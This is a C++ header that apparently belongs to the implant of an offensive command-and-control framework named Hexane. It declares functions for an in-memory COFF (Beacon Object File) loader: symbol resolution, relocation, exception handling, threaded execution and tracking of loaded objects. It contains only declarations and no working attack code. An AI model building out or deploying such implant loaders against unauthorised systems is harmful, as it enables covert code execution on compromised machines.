#ifndef HEXANE_IMPLANT_OBJECTS_HPP
#define HEXANE_IMPLANT_OBJECTS_HPP
#include <core/corelib.hpp>

namespace Objects {
    LONG
    WINAPI
    FUNCTION
        ExceptionHandler(PEXCEPTION_POINTERS exception);

    BOOL
    FUNCTION
        ExecuteFunction(EXECUTABLE *object, CONST CHAR *entry, VOID *args, SIZE_T size);

    BOOL
    FUNCTION
        ProcessSymbol(CHAR *sym_string, VOID **pointer);

    BOOL
    FUNCTION
        BaseRelocation(const EXECUTABLE *object);

    VOID
    FUNCTION
        WrapperFunction(VOID *address, VOID *args, SIZE_T size);

    VOID
    FUNCTION
        AddCOFF(COFF_PARAMS *object);

    VOID
    FUNCTION
        RemoveCOFF(UINT32 bof_id);

    COFF_PARAMS*
    FUNCTION
        GetCOFF(uint32_t bof_id);

    VOID
    FUNCTION
        COFFThread(COFF_PARAMS *params);

    VOID
    FUNCTION
        Cleanup(EXECUTABLE *object);

    VOID
    FUNCTION
        COFFLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size);

}

#endif //HEXANE_IMPLANT_OBJECTS_HPP
